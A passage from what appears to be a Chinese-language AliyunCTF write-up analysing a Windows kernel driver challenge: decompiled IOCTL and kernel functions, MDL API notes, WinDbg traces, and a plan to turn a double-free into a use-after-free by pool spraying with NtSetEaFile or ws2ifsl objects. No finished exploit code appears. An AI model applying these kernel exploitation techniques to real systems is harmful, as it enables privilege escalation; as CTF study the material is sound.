</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">goto</span> LABEL_17;
</span></span><span style="display:flex;"><span>      MmUnmapLockedPages(__pStartAddr2, __pMdl2);
</span></span><span style="display:flex;"><span>      IoFreeMdl(<span style="color:#ff79c6">*</span>((PMDL <span style="color:#ff79c6">*</span>)DeviceExtension <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">5</span>));
</span></span><span style="display:flex;"><span>      __pVirtualAddress <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)DeviceExtension <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>);
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">LABEL_16</span>:
</span></span><span style="display:flex;"><span>      MmFreeContiguousMemory(__pVirtualAddress);
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">LABEL_17</span>:
</span></span><span style="display:flex;"><span>      irp<span style="color:#ff79c6">-&gt;</span>IoStatus.Information <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>i64;
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">goto</span> LABEL_34;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  v3 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xC0000010</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">LABEL_34</span>:
</span></span><span style="display:flex;"><span>  irp<span style="color:#ff79c6">-&gt;</span>IoStatus.Status <span style="color:#ff79c6">=</span> v3;
</span></span><span style="display:flex;"><span>  IofCompleteRequest(irp, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> v3;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="mdl">MDL</h3>
<p>memory descriptor list</p>
<p>跨一系列连续虚拟内存地址的 I/O 缓冲区可以分布在多个物理页中，并且这些页面可以是不连续的。 操作系统使用 <em>内存描述符列表</em> (MDL) 来描述虚拟内存缓冲区的物理页面布局。</p>
<ul>
<li>StartVa：page开始的地址</li>
<li>ByteOffset：在page内的偏移</li>
<li>ByteCount: 大小</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_MDL</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_MDL</span>      <span style="color:#ff79c6">*</span>Next;
</span></span><span style="display:flex;"><span>  CSHORT           Size;
</span></span><span style="display:flex;"><span>  CSHORT           MdlFlags;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_EPROCESS</span> <span style="color:#ff79c6">*</span>Process;
</span></span><span style="display:flex;"><span>  PVOID            MappedSystemVa;
</span></span><span style="display:flex;"><span>  PVOID            StartVa;
</span></span><span style="display:flex;"><span>  ULONG            ByteCount;
</span></span><span style="display:flex;"><span>  ULONG            ByteOffset;
</span></span><span style="display:flex;"><span>} MDL, <span style="color:#ff79c6">*</span>PMDL;
</span></span></code></pre></div><h3 id="api">API</h3>
<p><strong>MmAllocateContiguousMemory</strong>：分配一系列连续的NonPagedPool内存，并将其映射到系统地址空间，分配的内存未初始化</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// 返回已分配内存的基虚拟地址。
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>PVOID <span style="color:#50fa7b">MmAllocateContiguousMemory</span>(
</span></span><span style="display:flex;"><span>  [in] SIZE_T           NumberOfBytes,           <span style="color:#6272a4">// 要分配的连续内存块的大小（以字节为单位）
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  [in] PHYSICAL_ADDRESS HighestAcceptableAddress <span style="color:#6272a4">// 调用方可以使用的最高有效物理地址。
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>);
</span></span></code></pre></div><p>释放由 <strong>MmAllocateContiguousMemoryXxx</strong> 分配的一系列物理连续内存。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">MmFreeContiguousMemory</span>(
</span></span><span style="display:flex;"><span>  [in] PVOID BaseAddress
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>给定缓冲区的起始地址和长度， <strong>IoAllocateMdl</strong> 分配内存描述符列表 (MDL) 足以映射缓冲区（NonPagedPool）。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// 返回指向 MDL 的指针
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>PMDL <span style="color:#50fa7b">IoAllocateMdl</span>(
</span></span><span style="display:flex;"><span>  [in, optional]      __drv_aliasesMem PVOID VirtualAddress,   <span style="color:#6272a4">// 指向 MDL 要描述的缓冲区的基虚拟地址的指针。
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  [in]                ULONG                  Length,           <span style="color:#6272a4">// 指定 MDL 要描述的缓冲区的长度（以字节为单位）
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  [in]                BOOLEAN                SecondaryBuffer,  <span style="color:#6272a4">// 指示缓冲区是主缓冲区还是辅助缓冲区。
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  [in]                BOOLEAN                ChargeQuota,      <span style="color:#6272a4">// 预留给系统使用。 驱动程序必须将此参数设置为 **FALSE**。
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  [in, out, optional] PIRP                   Irp               <span style="color:#6272a4">// 指向要与 MDL 关联的 IRP 的指针
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Ntoskrnl.exe
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>result <span style="color:#ff79c6">=</span> (PMDL)ExAllocatePoolWithTag(NonPagedPoolNx, size, &#39; ldM&#39;);
</span></span></code></pre></div><p>创建一个MDL结构体，而这个结构体描述给出的VurtualAddress</p>
<p><strong>IoFreeMdl</strong> 释放调用方分配的内存描述符列表 (MDL) 。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">IoFreeMdl</span>(
</span></span><span style="display:flex;"><span>  [in] PMDL Mdl
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p><strong>MmBuildMdlForNonPagedPool</strong> 接收指定非分页虚拟内存缓冲区的 MDL，并更新它以描述基础物理页。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">MmBuildMdlForNonPagedPool</span>(
</span></span><span style="display:flex;"><span>  [in, out] PMDL MemoryDescriptorList    <span style="color:#6272a4">// 指向 MDL 的指针
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>);
</span></span></code></pre></div><p><strong>MmMapLockedPagesSpecifyCache</strong> 将 MDL 描述的物理页面映射到虚拟地址，并使调用方能够指定用于创建映射的缓存属性。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>PVOID <span style="color:#50fa7b">MmMapLockedPagesSpecifyCache</span>(
</span></span><span style="display:flex;"><span>  [in]           PMDL                                                                          MemoryDescriptorList,
</span></span><span style="display:flex;"><span>  [in]           __drv_strictType(KPROCESSOR_MODE <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">enum</span> <span style="color:#50fa7b">_MODE</span>,__drv_typeConst)KPROCESSOR_MODE AccessMode,
</span></span><span style="display:flex;"><span>  [in]           __drv_strictTypeMatch(__drv_typeCond)MEMORY_CACHING_TYPE                      CacheType,
</span></span><span style="display:flex;"><span>  [in, optional] PVOID                                                                         RequestedAddress,
</span></span><span style="display:flex;"><span>  [in]           ULONG                                                                         BugCheckOnFailure,
</span></span><span style="display:flex;"><span>  [in]           ULONG                                                                         Priority
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>映射 MDL 的 MmMapLockedPagesSpecifyCache 函数发现其既可以将 MDL 描述的虚拟地址缓冲区的物理页映射到内核虚拟地址空间中也可以映射到用户虚拟地址空间中，取决于其第二个参数 AccessMode</p>
<p>AccessMode：<strong>KernelMode</strong> 或 <strong>UserMode</strong>。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">enum</span> <span style="color:#50fa7b">_MODE</span> { 
</span></span><span style="display:flex;"><span>    KernelMode, 
</span></span><span style="display:flex;"><span>    UserMode, 
</span></span><span style="display:flex;"><span>    MaximumMode 
</span></span><span style="display:flex;"><span>} MODE; 
</span></span></code></pre></div><p><code>MmNonCached</code>：请求的内存不应由处理器缓存。</p>
<h3 id="debug">Debug</h3>
<p>分配了两个NonPagedPool内存，在Free后并没有把相关位置置为0，可以多次free。</p>
<p>下断点调试</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> lm m s<span style="color:#ff79c6">*</span>
</span></span><span style="display:flex;"><span>Browse full module list
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 查看start内存，PE文件格式
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>start             end                 module name
</span></span><span style="display:flex;"><span>fffff805`<span style="color:#bd93f9">1</span>b010000 fffff805`<span style="color:#bd93f9">1</span>b019000   sioctl     (no symbols)
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// IDA: 140005020 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// 偏移：0x5020 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> ba e1 sioctl<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x5020</span>  <span style="color:#6272a4">// ioctl
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> p
</span></span></code></pre></div><p><code>0x9C402400</code> IoAllocateMdl，根据返回值确定一下MDL的大小</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> 
</span></span><span style="display:flex;"><span>sioctl<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x521e</span><span style="color:#ff79c6">:</span>
</span></span><span style="display:flex;"><span>fffff80a`<span style="color:#bd93f9">9852521</span>e ff150cceffff    call    qword ptr [sioctl<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x2030</span> (fffff80a`<span style="color:#bd93f9">98522030</span>)]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">*</span>ffff880ab958ed20 <span style="color:#8be9fd;font-style:italic">size</span>:  <span style="color:#bd93f9">120</span> previous <span style="color:#8be9fd;font-style:italic">size</span>:    <span style="color:#bd93f9">0</span>  (Allocated) <span style="color:#ff79c6">*</span>Mdl
</span></span></code></pre></div><p>但是程序走到Memset会报错，因为地址不对，可以从汇编看出来使用32位地址截断</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">000000014000526F</span>                 mov     ecx, r12d       ; Dst
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">0000000140005272</span>                 mov     edx, <span style="color:#bd93f9">0FF</span>h       ; Val
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">0000000140005277</span>                 mov     r8d, r15d       ; Size
</span></span></code></pre></div><h3 id="ionpfrws2p">Io/NpFr/Ws2P</h3>
<p>官方WP：<a href="https://xz.aliyun.com/t/14190">第二届AliyunCTF官方writeup</a> &ndash; 因为这里设计是给32位程序使用的回调，64位程序的用户态地址在发生integer truncation后往往是非法地址，预期是通过一个32位的程序完成利用</p>
<p>在VS里选择x86生成，<code>0x9C402400</code> 确实没有崩溃。</p>
<ul>
<li>这里还必须得使用，因为如果 <code>MmAllocateContiguousMemory</code> 分配的内存被连续释放会蓝屏</li>
</ul>
<p>思路是 DF 转化为 指定结构体的 UAF。</p>
<p>这里作者介绍了两种堆喷的对象</p>
<ul>
<li>IopVerifierExAllocatePoolWithQuota的调用中会申请类型为NonPagedPoolNx的Pool</li>
<li>经典的NpFr</li>
</ul>
<h4 id="io">IO</h4>
<p>这个<strong>结构大小可以控制，内容可以控制</strong>，品相相当不错</p>
<p>IopVerifierExAllocatePoolWithQuota：其上层调用如NtSetInformationFile、NtSetEaFile等函数都可以实现控制申请pool的大小，并写入内容。但是却存在一个问题，就是这类poolTag为IO的池，都会在IO结束时被释放，虽然被释放了，但是当前内核池的内容并没有立即被占用，内容还在。</p>
<p>相关内容：<a href="https://www.anquanke.com/post/id/255916">etw 事件管理器内核漏洞利用</a></p>
<p>ntkrnlImp.exe（ntoskrnl.exe）</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>PVOID <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">IopVerifierExAllocatePoolWithQuota</span>(<span style="color:#ff79c6">__int64</span> a1, SIZE_T a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  PVOID result; <span style="color:#6272a4">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>ViVerifierEnabled
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">||</span> (VfRuleClasses <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xFFAFFFFF</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&amp;&amp;</span> (VfRuleClasses <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0x200000000</span>i64) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&amp;&amp;</span> (VfRuleClasses <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0x400000000</span>i64) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> ExAllocatePoolWithQuotaTag(NonPagedPoolNx, a2, &#39;  oI&#39;);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  result <span style="color:#ff79c6">=</span> ExAllocatePoolWithTagPriority(
</span></span><span style="display:flex;"><span>             NonPagedPoolNx,
</span></span><span style="display:flex;"><span>             a2,
</span></span><span style="display:flex;"><span>             <span style="color:#bd93f9">0x20206F49u</span>,
</span></span><span style="display:flex;"><span>             (EX_POOL_PRIORITY)((MmVerifierData <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0x10</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">0x40u</span>) <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">1</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>result )
</span></span><span style="display:flex;"><span>    RtlRaiseStatus(<span style="color:#bd93f9">3221225626</span>i64);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>交叉引用：NtSetEaFile，该函数内部检测DEVICE_OBJECT的Flags是否包含4（DO_BUFFERED_IO），因此第一个参数的句柄给的是<code>PEAuth</code>的文件句柄，EVICE_OBJECT的Flags为0x44。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>NTSYSAPI 
</span></span><span style="display:flex;"><span>NTSTATUS
</span></span><span style="display:flex;"><span>NTAPI
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">NtSetEaFile</span>(
</span></span><span style="display:flex;"><span>  IN HANDLE               FileHandle,
</span></span><span style="display:flex;"><span>  OUT PIO_STATUS_BLOCK    IoStatusBlock,
</span></span><span style="display:flex;"><span>  IN PVOID                EaBuffer,
</span></span><span style="display:flex;"><span>  IN ULONG                EaBufferSize 
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// sets extended-attribute (EA) values for a file.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">NtSetEaFile</span>(<span style="color:#8be9fd">int</span> a1, <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> a2, <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> a3, ULONG a4)
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// ...
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>v4 <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)a3;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// ...
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// v12 是经过 a1(FileHandler) 寻找到的Object
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>DeviceObject <span style="color:#ff79c6">=</span> IoGetRelatedDeviceObject(v12);
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// ...
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>Flags <span style="color:#ff79c6">=</span> DeviceObject<span style="color:#ff79c6">-&gt;</span>Flags;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> ( (Flags <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>	ErrorOffset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>	v26 <span style="color:#ff79c6">=</span> a4;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> ( a4 )
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  v35 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>	  PoolWithQuota <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_FILE_FULL_EA_INFORMATION</span> <span style="color:#ff79c6">*</span>)IopVerifierExAllocatePoolWithQuota(<span style="color:#bd93f9">0</span>i64, a4);
</span></span><span style="display:flex;"><span>	  Irp<span style="color:#ff79c6">-&gt;</span>AssociatedIrp.MasterIrp <span style="color:#ff79c6">=</span> (_IRP <span style="color:#ff79c6">*</span>)PoolWithQuota;
</span></span><span style="display:flex;"><span>	  memmove(PoolWithQuota, v4, a4);
</span></span><span style="display:flex;"><span>	  <span style="color:#6272a4">// ...
</span></span></span></code></pre></div><h4 id="ws2p">Ws2P</h4>
<p>另外一个对象，作者给出 <code>ws2ifsl</code>，可以看如下的文章了解一下</p>
<ul>
<li><a href="https://www.anquanke.com/post/id/196893">Windows内核ws2ifsl.sys中UAF漏洞分析</a></li>
<li><a href="https://bbs.kanxue.com/thread-257435.htm">CVE-2019-1215分析笔记</a></li>
</ul>
<p>当调用NtCreateFile时，文件名设置为<code>\Device\WS2IFSL\</code>，将调用DispatchCreate函数，函数将根据文件名中的<code>_FILE_FULL_EA_INFORMATION.EaName</code>字符串进行判断，如果是NifsPvd，它将调用CreateProcessFile，如果是NifsSct，它将调用CreateSocketFile。</p>
<p>CreateProcessFile函数都创建内部对象，称为<code>procData</code>。创建后，这些对象将保存在文件对象的<code>_FILE_OBJECT.FsContext</code>中</p>
<p>ws2ifsl.sys!DispatchCreate</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">DispatchCreate</span>(<span style="color:#ff79c6">__int64</span> a1, IRP <span style="color:#ff79c6">*</span>a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">__int64</span> MasterIrp; <span style="color:#6272a4">// rbx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_IO_STACK_LOCATION</span> <span style="color:#ff79c6">*</span>CurrentStackLocation; <span style="color:#6272a4">// rsi
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> v5; <span style="color:#6272a4">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> ProcessFile; <span style="color:#6272a4">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> v7; <span style="color:#6272a4">// ebx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  MasterIrp <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">__int64</span>)a2<span style="color:#ff79c6">-&gt;</span>AssociatedIrp.MasterIrp;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>MasterIrp )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">goto</span> LABEL_8;
</span></span><span style="display:flex;"><span>  CurrentStackLocation <span style="color:#ff79c6">=</span> a2<span style="color:#ff79c6">-&gt;</span>Tail.Overlay.CurrentStackLocation;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(MasterIrp <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">5</span>) <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">7</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">goto</span> LABEL_8;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( strcmp_0((<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)(MasterIrp <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>), <span style="color:#f1fa8c">&#34;NifsSct&#34;</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>strcmp_0((<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)(MasterIrp <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>), <span style="color:#f1fa8c">&#34;NifsPvd&#34;</span>) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      ProcessFile <span style="color:#ff79c6">=</span> CreateProcessFile((<span style="color:#ff79c6">__int64</span>)CurrentStackLocation<span style="color:#ff79c6">-&gt;</span>FileObject, a2<span style="color:#ff79c6">-&gt;</span>RequestorMode, MasterIrp);
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">goto</span> LABEL_7;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">LABEL_8</span>:
</span></span><span style="display:flex;"><span>    v7 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1073741811</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">goto</span> LABEL_9;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  LOBYTE(v5) <span style="color:#ff79c6">=</span> a2<span style="color:#ff79c6">-&gt;</span>RequestorMode;
</span></span><span style="display:flex;"><span>  ProcessFile <span style="color:#ff79c6">=</span> CreateSocketFile(CurrentStackLocation<span style="color:#ff79c6">-&gt;</span>FileObject, v5, MasterIrp);
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">LABEL_7</span>:
</span></span><span style="display:flex;"><span>  v7 <span style="color:#ff79c6">=</span> ProcessFile;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">LABEL_9</span>:
</span></span><span style="display:flex;"><span>  a2<span style="color:#ff79c6">-&gt;</span>IoStatus.Information <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>i64;
</span></span><span style="display:flex;"><span>  a2<span style="color:#ff79c6">-&gt;</span>IoStatus.Status <span style="color:#ff79c6">=</span> v7;
</span></span><span style="display:flex;"><span>  IofCompleteRequest(a2, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> v7;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ws2ifsl!CreateProcessFile，一个tag位Ws2P的池 ProcData</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">CreateProcessFile</span>(PFILE_OBJECT pFileObj, KPROCESSOR_MODE Mode, <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_IRP</span> <span style="color:#ff79c6">*</span>Irp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// ...
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  Blink <span style="color:#ff79c6">=</span> Irp<span style="color:#ff79c6">-&gt;</span>ThreadListEntry.Blink;
</span></span><span style="display:flex;"><span>  Flink <span style="color:#ff79c6">=</span> Irp<span style="color:#ff79c6">-&gt;</span>ThreadListEntry.Flink;
</span></span><span style="display:flex;"><span>  MasterIrp <span style="color:#ff79c6">=</span> Irp<span style="color:#ff79c6">-&gt;</span>AssociatedIrp.MasterIrp;
</span></span><span style="display:flex;"><span>  Flags <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">**</span>)<span style="color:#ff79c6">&amp;</span>Irp<span style="color:#ff79c6">-&gt;</span>Flags;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">LABEL_7</span>:
</span></span><span style="display:flex;"><span>  Object <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>i64;
</span></span><span style="display:flex;"><span>  v12 <span style="color:#ff79c6">=</span> ObReferenceObjectByHandle(Flags, <span style="color:#bd93f9">0x10u</span>, (POBJECT_TYPE)PsThreadType, Mode, <span style="color:#ff79c6">&amp;</span>Object, <span style="color:#bd93f9">0</span>i64);
</span></span><span style="display:flex;"><span>  _object <span style="color:#ff79c6">=</span> Object;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( v12 <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v14 <span style="color:#ff79c6">=</span> IoThreadToProcess((PETHREAD)Object);
